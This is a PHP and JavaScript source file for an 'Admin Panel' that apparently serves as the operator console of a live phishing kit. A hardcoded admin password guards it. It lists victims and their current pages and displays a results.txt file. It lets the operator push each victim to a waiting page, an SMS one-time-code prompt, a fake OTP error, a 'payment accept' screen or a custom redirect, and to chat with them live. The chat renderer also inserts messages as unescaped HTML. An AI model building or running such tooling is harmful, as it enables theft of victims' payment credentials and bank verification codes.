<?php
session_start();
require_once __DIR__ . '/lib/user_panel.php';

$resultsFile = __DIR__ . '/results.txt';
$validUser = 'admin';
$validPass = 'JJKadmin2026';
$message = '';

function sanitizeUserId($value)
{
    return preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $value);
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    $user = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if ($user === $validUser && $pass === $validPass) {
        $_SESSION['is_admin'] = true;
    } else {
        $message = 'Invalid username or password.';
    }
}

$isAdmin = !empty($_SESSION['is_admin']);
$users = panelReadUsers();
$selectedUserId = sanitizeUserId($_GET['user'] ?? $_POST['user_id'] ?? '');
if ($selectedUserId === '' && !empty($users)) {
    $selectedUserId = array_key_first($users);
}

if ($isAdmin && isset($_POST['ajax']) && $_POST['ajax'] === 'update_sms') {
    $smsMode = $_POST['sms_mode'] ?? 'default';
    $customUrl = trim($_POST['custom_url'] ?? '');
    $customError = trim($_POST['custom_error'] ?? '');
    $instruction = $_POST['instruction'] ?? 'stay_wait';
    $chatEnabled = !empty($_POST['chat_enabled']);
    $targetUserId = sanitizeUserId($_POST['user_id'] ?? '');

    $validModes = ['default', 'payment_accept', 'redirect_wait', 'redirect_custom', 'error_verification'];
    $validInstructions = ['stay_wait', 'prompt_otp', 'otp_error', 'otp_pass'];

    if ($targetUserId === '') {
        $message = 'Please choose a user before applying updates.';
        $success = false;
    } elseif (!in_array($smsMode, $validModes, true)) {
        $message = 'Invalid SMS mode selection.';
        $success = false;
    } elseif (!in_array($instruction, $validInstructions, true)) {
        $message = 'Invalid instruction selection.';
        $success = false;
    } elseif ($smsMode === 'redirect_custom' && !filter_var($customUrl, FILTER_VALIDATE_URL)) {
        $message = 'Please provide a full, valid URL for custom redirects (e.g., https://example.com/page).';
        $success = false;
    } else {
        panelSaveState($targetUserId, $smsMode, $customUrl, $customError, $instruction, $chatEnabled);
        $message = 'User flow updated successfully.';
        $success = true;
    }

    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success ?? false,
        'message' => $message,
        'state' => $targetUserId !== '' ? panelLoadState($targetUserId) : panelDefaults()
    ]);
    exit;
}

$currentState = $selectedUserId !== '' ? panelLoadState($selectedUserId) : panelDefaults();
$currentRoute = $currentState['instruction'] === 'stay_wait' ? 'waiting' : 'sms';
$currentSmsAction = 'show_sms_error';
if ($currentState['mode'] === 'payment_accept' || $currentState['instruction'] === 'otp_pass') {
    $currentSmsAction = 'show_payment_accept';
} elseif ($currentState['mode'] === 'redirect_custom' || $currentState['mode'] === 'redirect_wait') {
    $currentSmsAction = 'redirection_url';
}
$chatLog = $selectedUserId !== '' ? panelLoadChat($selectedUserId) : [];
$resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>body{font-family:Arial;background:#0a0a0a;color:#f3f3f3;margin:0}.container{max-width:1250px;margin:20px auto;padding:20px;background:#121212;border:1px solid #2b2b2b;border-radius:12px}.grid{display:grid;grid-template-columns:280px 1fr;gap:15px}.card{background:#1a1a1a;border:1px solid #2f2f2f;border-radius:10px;padding:14px}.users a{display:block;padding:9px;border-radius:8px;color:#ddd;text-decoration:none;margin-bottom:8px;background:#171717}.users a.active{background:#273041;color:#fff}.meta{font-size:12px;color:#a5a5a5}.chat-box{max-height:280px;overflow:auto;background:#111;border:1px solid #333;padding:10px;border-radius:8px}.chat-message{padding:8px;border-radius:8px;margin:8px 0}.chat-message.user{background:#1d331f}.chat-message.admin{background:#1f2f40}.row{margin-bottom:12px}label{display:block;font-weight:600;margin-bottom:6px}input[type=text],input[type=password],textarea,select{width:100%;padding:10px 12px;border-radius:10px;border:1px solid #333;background:#101010;color:#f3f3f3}.control-card{background:linear-gradient(180deg,#1b1f2d,#171717);border-color:#394664}.control-card .row-group{padding:12px;border:1px solid #2a3148;border-radius:10px;background:#0f1320;margin-bottom:12px}.row-hint{font-size:12px;color:#9cb0d8;margin-top:4px}.hidden{display:none}.admin-select{border-color:#42527d;background:#0d1426}.admin-select:focus,textarea:focus,input[type=text]:focus{outline:none;border-color:#6e86c1;box-shadow:0 0 0 2px rgba(110,134,193,.2)}button{background:#e50914;color:#fff;border:none;padding:10px 14px;border-radius:7px;cursor:pointer}.flash{padding:10px;border-radius:7px;background:#15311a;border:1px solid #2f5c33;display:none}.flash.error{background:#3a1717;border-color:#7d2e2e}.chat-input-wide{min-height:115px;resize:vertical}</style>
</head>
<body>
<?php if (!$isAdmin): ?>
<div class="container" style="max-width:420px;margin-top:80px;">
    <h1>Admin Login</h1>
    <?php if ($message): ?><div class="flash error" style="display:block"><?php echo htmlspecialchars($message); ?></div><?php endif; ?>
    <form method="post">
        <input type="hidden" name="action" value="login">
        <div class="row"><label>Username</label><input type="text" name="username" required></div>
        <div class="row"><label>Password</label><input type="password" name="password" required></div>
        <button type="submit">Login</button>
    </form>
</div>
<?php else: ?>
<div class="container">
    <div style="display:flex;justify-content:space-between;align-items:center"><h1>Admin Panel (TXT Multi User)</h1><a href="?logout=1" style="color:#9ed0ff">Logout</a></div>
    <div class="grid">
        <div class="card users">
            <h3>Users</h3>
            <?php if (empty($users)): ?><div class="meta">No users yet.</div><?php endif; ?>
            <?php foreach ($users as $user): ?>
                <a href="?user=<?php echo urlencode($user['id']); ?>" class="<?php echo $selectedUserId === $user['id'] ? 'active' : ''; ?>">
                    <strong><?php echo htmlspecialchars($user['name'] ?: 'Unknown'); ?></strong><br>
                    <span class="meta">ID: <?php echo htmlspecialchars($user['id']); ?></span><br>
                    <span class="meta">Page: <?php echo htmlspecialchars($user['page']); ?></span>
                </a>
            <?php endforeach; ?>
        </div>
        <div>
            <div class="card control-card">
                <h3>Control selected user</h3>
                <div class="meta">Selected ID: <strong id="selected-user-id"><?php echo htmlspecialchars($selectedUserId ?: '-'); ?></strong></div>
                <div class="flash" id="flash-message"></div>
                <form id="sms-form">
                    <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($selectedUserId); ?>">
                    <input type="hidden" name="sms_mode" id="sms_mode" value="default">
                    <input type="hidden" name="instruction" id="instruction" value="stay_wait">
                    <div class="row-group">
                        <div class="row"><label>Control route</label><select id="control_route" class="admin-select">
                            <?php foreach (['waiting'=>'Send user to Waiting page','sms'=>'Send user to SMS page'] as $k=>$v): ?>
                                <option value="<?php echo $k; ?>" <?php echo $currentRoute===$k?'selected':''; ?>><?php echo $v; ?></option>
                            <?php endforeach; ?>
                        </select>
                        <div class="row-hint">First choose where the user should be directed.</div></div>
                        <div class="row hidden" id="sms-actions-row"><label>SMS action</label><select id="sms_action" class="admin-select">
                            <?php foreach (['show_sms_error'=>'Show SMS error','redirection_url'=>'Redirection URL','show_payment_accept'=>'Show payment accept'] as $k=>$v): ?>
                                <option value="<?php echo $k; ?>" <?php echo $currentSmsAction===$k?'selected':''; ?>><?php echo $v; ?></option>
                            <?php endforeach; ?>
                        </select>
                        <div class="row-hint">This menu appears only when SMS is selected.</div></div>
                    </div>
                    <div class="row hidden" id="custom-url-row"><label>Redirection URL</label><input type="text" name="custom_url" id="custom_url" placeholder="https://example.com/redirect" value="<?php echo htmlspecialchars($currentState['custom_url'] ?? ''); ?>"></div>
                    <div class="row hidden" id="custom-error-row"><label>Custom error message</label><textarea name="custom_error" class="chat-input-wide" placeholder="Write a custom error message for SMS page..."><?php echo htmlspecialchars($currentState['custom_error'] ?? ''); ?></textarea></div>
                    <button type="submit">Apply Update</button>
                </form>
            </div>
            <div class="card" style="margin-top:12px">
                <h3>Live Chat</h3>
                <div class="row"><label><input type="checkbox" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for this user</label></div>
                <div class="chat-box" id="chat-box">
                    <?php if (empty($chatLog)): ?><div class="meta">No messages yet.</div><?php endif; ?>
                    <?php foreach ($chatLog as $entry): ?>
                        <div class="chat-message <?php echo htmlspecialchars($entry['sender']); ?>">
                            <?php echo nl2br(htmlspecialchars($entry['message'])); ?>
                            <div class="meta"><?php echo htmlspecialchars($entry['sender']); ?> • <?php echo date('Y-m-d H:i:s', $entry['timestamp']); ?></div>
                        </div>
                    <?php endforeach; ?>
                </div>
                <div class="row" style="margin-top:8px"><textarea id="admin-chat-message" class="chat-input-wide" placeholder="Write your message"></textarea></div>
                <button type="button" id="send-admin-message">Send</button>
            </div>
            <div class="card" style="margin-top:12px"><h3>results.txt</h3><pre style="white-space:pre-wrap"><?php echo htmlspecialchars($resultsContent); ?></pre></div>
        </div>
    </div>
</div>
<?php endif; ?>
<script>
const selectedUserId = <?php echo json_encode($selectedUserId); ?>;
const smsForm = document.getElementById('sms-form');
const flashMessage = document.getElementById('flash-message');
const chatBox = document.getElementById('chat-box');
const chatInput = document.getElementById('admin-chat-message');
const sendButton = document.getElementById('send-admin-message');
const controlRoute = document.getElementById('control_route');
const smsActionsRow = document.getElementById('sms-actions-row');
const smsAction = document.getElementById('sms_action');
const smsModeField = document.getElementById('sms_mode');
const instructionField = document.getElementById('instruction');
const customUrlRow = document.getElementById('custom-url-row');
const customErrorRow = document.getElementById('custom-error-row');
const customUrlField = document.getElementById('custom_url');

function syncControlState(){
    if(!controlRoute||!smsModeField||!instructionField){return;}
    const route = controlRoute.value;
    const action = smsAction ? smsAction.value : 'show_sms_error';
    const isSmsRoute = route === 'sms';
    const showCustomUrl = isSmsRoute && action === 'redirection_url';
    const showCustomError = isSmsRoute && action === 'show_sms_error';

    if (smsActionsRow) {
        smsActionsRow.classList.toggle('hidden', !isSmsRoute);
    }

    if (customUrlRow) {
        customUrlRow.classList.toggle('hidden', !showCustomUrl);
    }

    if (customErrorRow) {
        customErrorRow.classList.toggle('hidden', !showCustomError);
    }

    if(route === 'waiting'){
        instructionField.value = 'stay_wait';
        smsModeField.value = 'default';
        if(customUrlField){
            customUrlField.value = '';
        }
        return;
    }

    instructionField.value = 'prompt_otp';
    if(action === 'show_payment_accept'){
        smsModeField.value = 'payment_accept';
        instructionField.value = 'otp_pass';
    } else if(action === 'redirection_url'){
        smsModeField.value = 'redirect_custom';
    } else {
        smsModeField.value = 'error_verification';
        instructionField.value = 'otp_error';
    }
}

function renderChat(messages){if(!chatBox)return;chatBox.innerHTML='';if(!messages.length){chatBox.innerHTML='<div class="meta">No messages yet.</div>';return;}messages.forEach((entry)=>{const div=document.createElement('div');div.className='chat-message '+entry.sender;div.innerHTML=`${entry.message.replace(/\n/g,'<br>')}<div class="meta">${entry.sender} • ${entry.formatted}</div>`;chatBox.appendChild(div);});chatBox.scrollTop=chatBox.scrollHeight;}
async function fetchChat(){if(!selectedUserId)return;const res=await fetch('chat_api.php?action=fetch&user_id='+encodeURIComponent(selectedUserId));const data=await res.json();renderChat(data.messages||[]);} 
async function sendChat(){if(!selectedUserId||!chatInput||!chatInput.value.trim())return;const message=chatInput.value.trim();chatInput.value='';await fetch('chat_api.php?action=send',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({sender:'admin',message,user_id:selectedUserId})});fetchChat();}
if(sendButton){sendButton.addEventListener('click',sendChat);} if(chatInput){chatInput.addEventListener('keydown',(e)=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendChat();}});} if(selectedUserId){setInterval(fetchChat,1000);}
if(controlRoute){controlRoute.addEventListener('change',syncControlState);} if(smsAction){smsAction.addEventListener('change',syncControlState);} syncControlState();
if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';});}
</script>
</body>
</html>
